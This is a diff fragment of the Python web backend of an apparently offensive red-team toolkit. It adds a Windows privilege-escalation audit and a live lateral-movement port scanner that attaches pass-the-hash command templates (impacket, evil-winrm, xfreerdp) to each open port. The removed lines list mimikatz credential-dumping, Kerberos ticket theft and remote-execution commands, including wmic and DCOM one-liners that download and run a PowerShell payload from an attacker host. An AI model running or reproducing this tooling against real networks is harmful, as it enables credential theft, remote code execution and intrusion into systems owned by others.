+                                exe_part = img_str[:low.index(".exe") + 4]
+                                if " " in exe_part:
+                                    unquoted_service_paths.append({
+                                        "service": svc_name,
+                                        "image_path": img_str
+                                    })
+                    except Exception:
+                        pass
+            # Check AlwaysInstallElevated
+            for label, hive in (("HKCU", winreg.HKEY_CURRENT_USER), ("HKLM", winreg.HKEY_LOCAL_MACHINE)):
+                try:
+                    with winreg.OpenKey(hive, r"SOFTWARE\Policies\Microsoft\Windows\Installer", 0, winreg.KEY_READ) as ik:
+                        val, _ = winreg.QueryValueEx(ik, "AlwaysInstallElevated")
+                        always_install_elevated[label] = (val == 1)
+                except Exception:
+                    pass
+        except Exception:
+            pass
+    else:
+        try:
+            p_id = await asyncio.create_subprocess_exec(
+                "id", stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
+            )
+            out_id, _ = await asyncio.wait_for(p_id.communicate(), timeout=4.0)
+            current_identity = out_id.decode("utf-8", errors="replace").strip()
+        except Exception:
+            pass
+
+    high_risk_privs = [p for p in live_privileges if p.get("high_risk")]
+    return JSONResponse(content={
+        "audited_host": socket.gethostname(),
+        "current_identity": current_identity,
+        "os_platform": sys.platform,
+        "requested_os_profile": os_type,
+        "high_risk_token_privileges_count": len(high_risk_privs),
+        "live_token_privileges": live_privileges,
+        "unquoted_service_paths_found": unquoted_service_paths,
+        "always_install_elevated": always_install_elevated,
+        "writable_path_directories": writable_path_dirs[:25]
+    })
+
+# ── 16. Live Target Lateral Movement Port, Protocol & Banner Scanner ─
 @app.post("/api/redteam/lateral")
 async def redteam_lateral(req: RedTeamRequest):
-    target_ip = req.options.get("target_ip", "192.168.1.100")
-    domain    = req.options.get("domain", "CORP")
-    username  = req.options.get("username", "administrator")
-    lhost     = req.options.get("lhost", "10.10.10.10")
-    lport     = req.options.get("lport", "4444")
+    raw_ip   = (req.options.get("target_ip") or "127.0.0.1").strip()
+    clean_ip = re.sub(r'^https?://', '', raw_ip).split('/')[0].split(':')[0]
+    domain   = req.options.get("domain") or "WORKGROUP"
+    username = req.options.get("username") or "administrator"
+    lhost    = req.options.get("lhost") or "127.0.0.1"
 
-    techniques = {
-        "Pass-the-Hash": {"description": "Auth with NTLM hash, no plaintext needed",
-            "extract": ['mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit', 'mimikatz.exe "privilege::debug" "lsadump::sam" exit'],
-            "lateral": [f"impacket-psexec {domain}/{username}@{target_ip} -hashes :<NTLM>", f"impacket-wmiexec {domain}/{username}@{target_ip} -hashes :<NTLM>", f"crackmapexec smb {target_ip} -u {username} -H <NTLM> -x 'whoami'"]},
-        "PsExec / SMB": {"description": "Remote shell via SMB port 445",
-            "commands": [f"impacket-psexec {domain}/{username}:'Pass123'@{target_ip}", f"crackmapexec smb {target_ip} -u {username} -p 'Pass123' -x 'whoami'", f"psexec.exe \\\\{target_ip} -u {username} -p Pass123 cmd.exe"]},
-        "WMI Execution": {"description": "RCE via WMI — no service created",
-            "commands": [f"impacket-wmiexec {domain}/{username}:'Pass123'@{target_ip}", f'wmic /node:{target_ip} /user:{domain}\\{username} /password:Pass123 process call create "powershell -c IEX(IWR http://{lhost}/s.ps1)"']},
-        "Evil-WinRM": {"description": "Full PowerShell session via WinRM (5985/5986)",
-            "commands": [f"evil-winrm -i {target_ip} -u {username} -p 'Pass123'", f"evil-winrm -i {target_ip} -u {username} -H <NTLM>"]},
-        "Pass-the-Ticket": {"description": "Kerberos ticket injection — no password",
-            "extract": ['mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" exit', "Rubeus.exe dump /luid:0x3e7"],
-            "inject": ['mimikatz.exe "kerberos::ptt ticket.kirbi" exit', "Rubeus.exe ptt /ticket:<base64>"]},
-        "SSH Key Reuse": {"description": "Reuse SSH keys found on compromised host",
-            "commands": ["find / -name id_rsa 2>/dev/null", f"ssh -i /home/user/.ssh/id_rsa {username}@{target_ip}", "cat ~/.ssh/known_hosts"]},
-        "Network Discovery": {"description": "Map internal network from foothold",
-            "commands": [f"nmap -sV -p 22,80,135,139,443,445,3389 {target_ip}/24", f"crackmapexec smb {target_ip}/24", f'1..254 | %{{ping -n 1 -w 50 192.168.1.$_ > nul; if($?) {{ "192.168.1.$_ UP" }}}}']},
-        "Token Impersonation": {"description": "Steal logged-in user tokens (requires SeImpersonatePrivilege)",
-            "commands": ["# Metasploit: use incognito → list_tokens -u → impersonate_token", "# PowerShell: Invoke-TokenManipulation -ImpersonateUser -Username 'DOMAIN\\Admin'"]},
-        "BloodHound / AD Enum": {"description": "Map AD attack paths to Domain Admin",
-            "commands": ["SharpHound.exe --CollectionMethod All", "python3 bloodhound.py -d domain.com -u user -p pass -ns <DC_IP> -c all", "# Import .zip into BloodHound → shortest path to DA"]},
-        "DCOM Execution": {"description": "RCE via Distributed COM objects",
-            "commands": [f'$com = [Activator]::CreateInstance([Type]::GetTypeFromProgID("MMC20.Application","{target_ip}"))\n$com.Document.ActiveView.ExecuteShellCommand("powershell",$null,"-c IEX(IWR http://{lhost}/s.ps1)","7")']},
-    }
+    lateral_ports = [
+        (22,   "SSH",          "SSH Remote Shell / Key Reuse"),
+        (80,   "HTTP",         "Web Application / Reverse Proxy"),
+        (88,   "Kerberos",     "Active Directory Kerberos KDC (Pass-the-Ticket)"),
+        (135,  "MS-RPC",       "DCE/RPC Endpoint Mapper (WMI / DCOM Execution)"),
+        (139,  "NetBIOS-SSN",  "NetBIOS Session Service"),
+        (389,  "LDAP",         "Active Directory LDAP Directory"),
+        (443,  "HTTPS",        "TLS Web / Management Interface"),
+        (445,  "SMB",          "Server Message Block (PsExec / Pass-the-Hash / SMBExec)"),
+        (1433, "MSSQL",        "Microsoft SQL Server (xp_cmdshell)"),
+        (3306, "MySQL",        "MySQL Database Transport"),
+        (3389, "RDP",          "Remote Desktop Protocol (RestrictedAdmin PTH)"),
+        (5432, "PostgreSQL",   "PostgreSQL Database Transport"),
+        (5985, "WinRM-HTTP",   "Windows Remote Management HTTP (Evil-WinRM)"),
+        (5986, "WinRM-HTTPS",  "Windows Remote Management HTTPS (Evil-WinRM SSL)"),
+        (8081, "HTTP-Alt-8081","Local HTTP Service (8081)"),
+        (8083, "HTTP-Alt-8083","TestMe Honeypot Service (8083)"),
+    ]
 
-    return JSONResponse(content={"target_ip": target_ip, "domain": domain,
-        "techniques": techniques,
-        "recommended_tools": ["Impacket", "CrackMapExec", "Evil-WinRM", "Mimikatz", "Rubeus", "BloodHound", "SharpHound", "Cobalt Strike"],
-        "note": "Use only on networks you own or have explicit written authorization to test."})
+    open_vectors: List[Dict[str, Any]] = []
+    closed_ports: List[int] = []
+
+    async def _probe_lateral_port(port: int, proto: str, vector_desc: str):
+        t0 = time.time()
+        try:
+            reader, writer = await asyncio.wait_for(asyncio.open_connection(clean_ip, port), timeout=1.2)
+            rtt_ms = round((time.time() - t0) * 1000, 1)
+            banner = ""
+            try:
+                if port in (80, 5985, 8081, 8083):
+                    writer.write(f"HEAD / HTTP/1.1\r\nHost: {clean_ip}\r\nConnection: close\r\n\r\n".encode())
+                    await writer.drain()
+                data = await asyncio.wait_for(reader.read(160), timeout=0.6)
+                if data:
+                    banner = data.decode("utf-8", errors="replace").splitlines()[0][:100].strip()
+            except Exception:
+                pass
+            writer.close()
+            try:
+                await writer.wait_closed()
+            except Exception:
+                pass
+
+            cmd_hint = ""
+            if port == 445:
+                cmd_hint = f"impacket-psexec {domain}/{username}@{clean_ip} -hashes :<NTLM>"
+            elif port in (5985, 5986):
+                cmd_hint = f"evil-winrm -i {clean_ip} -u {username} -H <NTLM>"
+            elif port == 135:
+                cmd_hint = f"impacket-wmiexec {domain}/{username}@{clean_ip} -hashes :<NTLM>"
+            elif port == 22:
+                cmd_hint = f"ssh {username}@{clean_ip}"
+            elif port == 3389:
+                cmd_hint = f"xfreerdp /v:{clean_ip} /u:{username} /d:{domain} /pth:<NTLM>"
+
+            open_vectors.append({
+                "port": port,
+                "service": proto,
+                "state": "OPEN",
+                "rtt_ms": rtt_ms,
+                "banner": banner or "TCP SYN/ACK Verified",
+                "lateral_vector": vector_desc,
+                "command_template": cmd_hint
+            })
+        except Exception:
+            closed_ports.append(port)
+
+    await asyncio.gather(*[_probe_lateral_port(p, s, d) for p, s, d in lateral_ports])
+    open_vectors.sort(key=lambda x: x["port"])
+
+    return JSONResponse(content={
+        "target_ip": clean_ip,
+        "domain": domain,
+        "username": username,
+        "lhost": lhost,
+        "probed_ports_count": len(lateral_ports),
+        "open_lateral_vectors_count": len(open_vectors),
+        "open_lateral_vectors": open_vectors,
+        "closed_or_filtered_ports": sorted(closed_ports)
+    })
 
 @app.api_route("/api/recon/wifi-audit", methods=["GET", "POST"])
 async def wifi_security_audit():
